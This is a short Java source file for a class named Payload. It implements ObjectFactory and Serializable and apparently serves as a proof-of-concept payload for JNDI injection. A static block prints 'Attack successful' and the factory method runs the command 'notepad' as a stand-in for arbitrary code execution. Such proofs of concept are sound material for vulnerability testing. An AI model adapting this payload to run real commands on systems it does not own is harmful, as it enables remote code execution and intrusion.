import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class Payload implements Serializable, ObjectFactory {
    static {
        System.out.println("Attack successful");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("notepad");
        return null;
    }
}
